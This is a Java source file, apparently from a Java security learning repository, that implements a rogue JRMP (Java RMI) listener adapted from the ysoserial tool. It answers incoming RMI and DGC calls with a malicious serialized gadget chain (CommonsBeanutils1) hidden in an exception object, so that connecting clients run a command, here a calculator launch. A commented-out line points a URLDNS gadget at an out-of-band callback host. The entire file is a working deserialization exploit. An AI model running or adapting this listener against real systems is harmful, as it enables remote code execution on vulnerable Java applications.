package com.pinger.javasec.common;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.net.*;
import java.rmi.MarshalException;
import java.rmi.server.ObjID;
import java.rmi.server.UID;
import java.util.Arrays;

import javax.management.BadAttributeValueExpException;
import javax.net.ServerSocketFactory;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import sun.rmi.transport.TransportConstants;


public class JRMPListener implements Runnable {


    private int port;
    private Object payloadObject;
    private ServerSocket ss;
    private Object waitLock = new Object();
    private boolean exit;
    private boolean hadConnection;
    private URL classpathUrl;

    public static final void main (final String[] args ) throws Exception{

        // 这里设置反序列化的Gadget
//        final Object payloadObject = URLDNS.getObject("http://jrmptest.08672jbceh9r0wh9egnfsi9fq6wxkm.oastify.com");
        final Object payloadObject = CommonsBeanutils1.getPayload("open -a Calculator.app");

        // 这里设置端口
        int listenerpPort = 4599;

        try {
            int port = listenerpPort;
            System.err.println("* Opening JRMP listener on " + port);
            JRMPListener c = new JRMPListener(port, payloadObject);
            c.run();
        }
        catch ( Exception e ) {
            System.err.println("Listener error");
            e.printStackTrace(System.err);
        }
    }




    public JRMPListener ( int port, Object payloadObject ) throws NumberFormatException, IOException {
        this.port = port;
        this.payloadObject = payloadObject;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }

    public JRMPListener (int port, String className, URL classpathUrl) throws IOException {
        this.port = port;
        this.payloadObject = makeDummyObject(className);
        this.classpathUrl = classpathUrl;
        this.ss = ServerSocketFactory.getDefault().createServerSocket(this.port);
    }


    public boolean waitFor ( int i ) {
        try {
            if ( this.hadConnection ) {
                return true;
            }
            System.err.println("Waiting for connection");
            synchronized ( this.waitLock ) {
                this.waitLock.wait(i);
            }
            return this.hadConnection;
        }
        catch ( InterruptedException e ) {
            return false;
        }
    }


    /**
     *
     */
    public void close () {
        this.exit = true;
        try {
            this.ss.close();
        }
        catch ( IOException e ) {}
        synchronized ( this.waitLock ) {
            this.waitLock.notify();
        }
    }





    @Override
    public void run () {
        try {
            Socket s = null;
            try {
                while ( !this.exit && ( s = this.ss.accept() ) != null ) {
                    try {
                        s.setSoTimeout(5000);
                        InetSocketAddress remote = (InetSocketAddress) s.getRemoteSocketAddress();
                        System.err.println("Have connection from " + remote);

                        InputStream is = s.getInputStream();
                        InputStream bufIn = is.markSupported() ? is : new BufferedInputStream(is);

                        // Read magic (or HTTP wrapper)
                        bufIn.mark(4);
                        DataInputStream in = new DataInputStream(bufIn);
                        int magic = in.readInt();

                        short version = in.readShort();
                        if ( magic != TransportConstants.Magic || version != TransportConstants.Version ) {
                            s.close();
                            continue;
                        }

                        OutputStream sockOut = s.getOutputStream();
                        BufferedOutputStream bufOut = new BufferedOutputStream(sockOut);
                        DataOutputStream out = new DataOutputStream(bufOut);

                        byte protocol = in.readByte();
                        switch ( protocol ) {
                            case TransportConstants.StreamProtocol:
                                out.writeByte(TransportConstants.ProtocolAck);
                                if ( remote.getHostName() != null ) {
                                    out.writeUTF(remote.getHostName());
                                } else {
                                    out.writeUTF(remote.getAddress().toString());
                                }
                                out.writeInt(remote.getPort());
                                out.flush();
                                in.readUTF();
                                in.readInt();
                            case TransportConstants.SingleOpProtocol:
                                doMessage(s, in, out, this.payloadObject);
                                break;
                            default:
                            case TransportConstants.MultiplexProtocol:
                                System.err.println("Unsupported protocol");
                                s.close();
                                continue;
                        }

                        bufOut.flush();
                        out.flush();
                    }
                    catch ( InterruptedException e ) {
                        return;
                    }
                    catch ( Exception e ) {
                        e.printStackTrace(System.err);
                    }
                    finally {
                        System.err.println("Closing connection");
                        s.close();
                    }

                }

            }
            finally {
                if ( s != null ) {
                    s.close();
                }
                if ( this.ss != null ) {
                    this.ss.close();
                }
            }

        }
        catch ( SocketException e ) {
            return;
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
    }


    private void doMessage ( Socket s, DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        System.err.println("Reading message...");

        int op = in.read();

        switch ( op ) {
            case TransportConstants.Call:
                // service incoming RMI call
                doCall(in, out, payload);
                break;

            case TransportConstants.Ping:
                // send ack for ping
                out.writeByte(TransportConstants.PingAck);
                break;

            case TransportConstants.DGCAck:
                UID u = UID.read(in);
                break;

            default:
                throw new IOException("unknown transport op " + op);
        }

        s.close();
    }


    private void doCall ( DataInputStream in, DataOutputStream out, Object payload ) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(in) {

            @Override
            protected Class<?> resolveClass ( ObjectStreamClass desc ) throws IOException, ClassNotFoundException {
                if ( "[Ljava.rmi.server.ObjID;".equals(desc.getName())) {
                    return ObjID[].class;
                } else if ("java.rmi.server.ObjID".equals(desc.getName())) {
                    return ObjID.class;
                } else if ( "java.rmi.server.UID".equals(desc.getName())) {
                    return UID.class;
                }
                throw new IOException("Not allowed to read object");
            }
        };

        ObjID read;
        try {
            read = ObjID.read(ois);
        }
        catch ( java.io.IOException e ) {
            throw new MarshalException("unable to read objID", e);
        }


        if ( read.hashCode() == 2 ) {
            ois.readInt(); // method
            ois.readLong(); // hash
            System.err.println("Is DGC call for " + Arrays.toString((ObjID[])ois.readObject()));
        }

        System.err.println("Sending return with payload for obj " + read);

        out.writeByte(TransportConstants.Return);// transport op

        ObjectOutputStream oos = new MarshalOutputStream(out, this.classpathUrl);


        oos.writeByte(TransportConstants.ExceptionalReturn);
        new UID().write(oos);

        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);

        Class<? extends BadAttributeValueExpException> clazz = ex.getClass();
        Field val = clazz.getDeclaredField("val");
        val.setAccessible(true);
        val.set(ex,payload);

        oos.writeObject(ex);

        oos.flush();
        out.flush();

        this.hadConnection = true;
        synchronized ( this.waitLock ) {
            this.waitLock.notifyAll();
        }
    }

    @SuppressWarnings({"deprecation"})
    protected static Object makeDummyObject (String className) {
        try {
            ClassLoader isolation = new ClassLoader() {};
            ClassPool cp = new ClassPool();
            cp.insertClassPath(new ClassClassPath(Dummy.class));
            CtClass clazz = cp.get(Dummy.class.getName());
            clazz.setName(className);
            return clazz.toClass(isolation).newInstance();
        }
        catch ( Exception e ) {
            e.printStackTrace();
            return new byte[0];
        }
    }


    public static class Dummy implements Serializable {
        private static final long serialVersionUID = 1L;

    }


    static final class MarshalOutputStream extends ObjectOutputStream {


        private URL sendUrl;

        public MarshalOutputStream(OutputStream out, URL u) throws IOException {
            super(out);
            this.sendUrl = u;
        }

        MarshalOutputStream(OutputStream out) throws IOException {
            super(out);
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            if (this.sendUrl != null) {
                writeObject(this.sendUrl.toString());
            } else if (!(cl.getClassLoader() instanceof URLClassLoader)) {
                writeObject(null);
            } else {
                URL[] us = ((URLClassLoader) cl.getClassLoader()).getURLs();
                String cb = "";

                for (URL u : us) {
                    cb += u.toString();
                }
                writeObject(cb);
            }
        }
    }
}
